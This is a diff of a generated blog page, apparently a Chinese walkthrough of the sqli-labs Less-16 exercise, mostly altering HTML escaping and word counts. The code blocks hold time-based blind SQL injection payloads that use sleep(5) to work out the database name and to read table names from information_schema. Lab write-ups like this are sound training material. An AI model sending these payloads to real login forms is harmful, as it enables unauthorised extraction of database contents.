@@ -8,9 +8,9 @@
     <meta name="description" content="注入步骤
 判断数据库字符串的长度
 
-admin&#34;) and if(ascii(length(database()))&amp;gt;56, 0, sleep(5))#
+admin&#34;) and if(ascii(length(database()))&gt;56, 0, sleep(5))#
 
-admin&#34;) and if(ascii(length(database())">
+admin&#34;) and if(ascii(length(database()))=5">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -421,7 +421,7 @@ admin&#34;) and if(ascii(length(database())">
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        237
+                        234
                     </div>
                     
 
@@ -447,21 +447,21 @@ admin&#34;) and if(ascii(length(database())">
                 <h2 id="注入步骤"><a href="#注入步骤" class="headerlink" title="注入步骤"></a>注入步骤</h2><ol>
 <li><strong>判断数据库字符串的长度</strong></li>
 </ol>
-<pre class="line-numbers language-bash"><code class="language-bash">admin"<span class="token punctuation">)</span> and if<span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>length<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">)</span><span class="token operator">&gt;</span>56, 0, sleep<span class="token punctuation">(</span>5<span class="token punctuation">))</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-bash"><code class="language-bash">admin"<span class="token punctuation">)</span> and if<span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>length<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">)</span><span class="token operator">></span>56, 0, sleep<span class="token punctuation">(</span>5<span class="token punctuation">))</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://i.loli.net/2019/11/04/QMI51DvbLS8CFjO.png" alt="less16-1.png"></p>
 <pre class="line-numbers language-bash"><code class="language-bash">admin"<span class="token punctuation">)</span> and if<span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>length<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">)</span><span class="token operator">=</span>56, 0, sleep<span class="token punctuation">(</span>5<span class="token punctuation">))</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://i.loli.net/2019/11/04/2hpJgend5mwB8Hq.png" alt="less16-2.png"></p>
 <ol start="2">
 <li><strong>判断数据库</strong></li>
 </ol>
-<pre class="line-numbers language-bash"><code class="language-bash">admin"<span class="token punctuation">)</span> and if<span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span>,1,1<span class="token punctuation">))</span><span class="token operator">&gt;</span>115, 0, sleep<span class="token punctuation">(</span>5<span class="token punctuation">))</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-bash"><code class="language-bash">admin"<span class="token punctuation">)</span> and if<span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span>,1,1<span class="token punctuation">))</span><span class="token operator">></span>115, 0, sleep<span class="token punctuation">(</span>5<span class="token punctuation">))</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://i.loli.net/2019/11/04/MtFigc9dbUP54wR.png" alt="less16-3.png"></p>
 <pre class="line-numbers language-bash"><code class="language-bash">admin"<span class="token punctuation">)</span> and if<span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span>,1,1<span class="token punctuation">))</span><span class="token operator">=</span>115, 0, sleep<span class="token punctuation">(</span>5<span class="token punctuation">))</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://i.loli.net/2019/11/04/aHYBrE32bzwpNlF.png" alt="less16-4.png"></p>
 <ol start="3">
 <li><strong>判断表</strong></li>
 </ol>
-<pre class="line-numbers language-bash"><code class="language-bash">admin"<span class="token punctuation">)</span> and if<span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token punctuation">((</span>select table_name from information_schema.tables where table_schema<span class="token operator">=</span><span class="token string">'security'</span> limit 0,1<span class="token punctuation">)</span>,1,1<span class="token punctuation">))</span><span class="token operator">&gt;</span>101, 0, sleep<span class="token punctuation">(</span>5<span class="token punctuation">))</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-bash"><code class="language-bash">admin"<span class="token punctuation">)</span> and if<span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token punctuation">((</span>select table_name from information_schema.tables where table_schema<span class="token operator">=</span><span class="token string">'security'</span> limit 0,1<span class="token punctuation">)</span>,1,1<span class="token punctuation">))</span><span class="token operator">></span>101, 0, sleep<span class="token punctuation">(</span>5<span class="token punctuation">))</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://i.loli.net/2019/11/04/sHFIJxU3ldpgwyn.png" alt="less16-5.png"></p>
 <pre class="line-numbers language-bash"><code class="language-bash">admin"<span class="token punctuation">)</span> and if<span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token punctuation">((</span>select table_name from information_schema.tables where table_schema<span class="token operator">=</span><span class="token string">'security'</span> limit 0,1<span class="token punctuation">)</span>,1,1<span class="token punctuation">))</span><span class="token operator">=</span>101, 0, sleep<span class="token punctuation">(</span>5<span class="token punctuation">))</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://i.loli.net/2019/11/04/mQULM4ZgyEfPaYT.png" alt="less16-6.png"></p>
@@ -739,7 +739,7 @@ admin&#34;) and if(ascii(length(database())">
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">46.5k</span>&nbsp;字
+                class="white-color">47.4k</span>&nbsp;字
                
             
 			
